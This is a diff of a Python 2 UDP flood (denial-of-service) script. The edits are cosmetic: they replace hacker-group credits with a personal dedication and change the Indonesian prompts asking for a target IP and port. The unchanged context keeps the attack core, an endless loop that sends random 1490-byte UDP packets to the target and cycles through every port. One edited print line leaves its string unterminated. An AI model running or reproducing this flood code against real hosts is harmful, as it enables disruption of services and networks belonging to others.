@@ -18,18 +18,18 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDOS JAVA 666")
+os.system("figlet HAY SAYANG KU ")
 print
-print "CREATE SC BY   : VANEZXX - 666"
-print "ORGANIZASI     : DARK HAT TEAM"
-print "THANK TO       : TEAM CYBER DARK HAT KP"
-print "KEADILAN PANCASILA TELAH HILANG || SALAM CREATOR"
+print "MY LOVER       : VANEZZ QUSTOVA"
+print "USER           : PREMIUM"
+print "CREATE BY    : VANEZZ QUSTOVA X JAVA C.H.A"
+print "##########################################
 print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = raw_input("IP / HOST TARGET NYA BANG : ")
+port = input("PORT NYA BERAPA PUH       : ")
 
 os.system("clear")
-os.system("figlet Mulai Penyerangan Website")
+os.system("figlet Mengirim Malware")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
@@ -45,6 +45,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Mengirim %s Virus Malware %s Ke Sistem:%s"%(sent,ip,port)
+     print "Mengirim %s Virus Malware %s Ke Port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
